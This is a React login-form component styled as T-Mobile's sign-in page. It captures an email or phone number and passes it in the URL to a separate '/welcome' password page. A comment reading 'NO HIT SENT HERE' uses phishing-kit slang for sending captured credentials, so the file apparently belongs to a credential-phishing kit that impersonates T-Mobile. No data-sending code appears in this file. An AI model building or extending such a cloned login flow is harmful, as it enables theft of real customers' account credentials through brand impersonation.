'use client';

import type React from "react";
import { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { ChevronRight } from "lucide-react";

export function LoginForm() {
  const [value, setValue] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const isPhone = /^[\d\s().+-]*$/.test(value) && /\d/.test(value);

  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
    const input = e.target.value;
    setError("");

    if (/^[\d\s().+-]*$/.test(input) && /\d/.test(input)) {
      const digits = input.replace(/\D/g, "").slice(0, 10);
      let formatted = digits;
      if (digits.length > 6) {
        formatted = `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
      } else if (digits.length > 3) {
        formatted = `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
      }
      setValue(formatted);
    } else {
      setValue(input);
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    const trimmed = value.trim();

    if (!trimmed) {
      setError("Please enter your email or phone number");
      setIsLoading(false);
      return;
    }

    if (isPhone) {
      const digits = trimmed.replace(/\D/g, "");
      if (digits.length !== 10) {
        setError("Invalid number. Please enter a 10-digit phone number.");
        setIsLoading(false);
        return;
      }
    }

    // NO HIT SENT HERE — only go to password page
    const query = `?id=${encodeURIComponent(trimmed)}`;
    router.push(`/welcome${query}`);
  };

  return (
    <div className="rounded-2xl border border-border bg-card p-8 shadow-sm md:p-12">
      <div className="grid gap-10 md:grid-cols-2 md:gap-0">
        <div className="md:pr-12">
          <h1 className="text-4xl font-bold tracking-tight text-foreground">Log in</h1>
          
          <form onSubmit={handleSubmit} className="mt-8 space-y-6">
            <div>
              <label htmlFor="username" className="sr-only">
                Email or phone number
              </label>
              <input
                id="username"
                type="text"
                value={value}
                onChange={handleChange}
                placeholder="Email or phone number"
                className={`w-full rounded-md border bg-background px-4 py-3 text-sm text-foreground outline-none placeholder:text-muted-foreground focus:ring-1 ${
                  error ? "border-destructive focus:border-destructive focus:ring-destructive" : "border-input focus:border-primary focus:ring-primary"
                }`}
              />
              {error && <p className="mt-2 text-sm font-medium text-destructive">{error}</p>}
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full rounded-full bg-muted px-6 py-3 text-sm font-semibold text-foreground transition-colors hover:bg-muted/80 disabled:opacity-70"
            >
              {isLoading ? "Next..." : "Next"}
            </button>
          </form>

          <div className="mt-10 space-y-1">
            <p className="text-sm font-bold text-foreground">Don&apos;t have a T-Mobile ID?</p>
            <Link href="/sign-up" className="inline-flex items-center gap-1 text-sm font-bold text-primary hover:underline">
              Sign up <ChevronRight className="h-4 w-4" />
            </Link>
          </div>
        </div>

        <div className="flex items-center border-t border-border pt-10 md:border-l md:border-t-0 md:pl-12 md:pt-0">
          <div className="w-full md:text-center">
            <h2 className="text-3xl font-bold tracking-tight text-foreground">New to T-Mobile?</h2>
            <p className="mx-auto mt-4 max-w-xs text-sm leading-relaxed text-muted-foreground">
              Explore our plans, find your next device, and see what makes us different.
            </p>
            <div className="mt-6 flex flex-wrap gap-4 md:justify-center">
              <button type="button" className="rounded-full border border-foreground bg-background px-6 py-2.5 text-sm font-bold text-foreground hover:bg-muted">
                Explore plans
              </button>
              <button type="button" className="rounded-full border border-foreground bg-background px-6 py-2.5 text-sm font-bold text-foreground hover:bg-muted">
                Shop deals
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
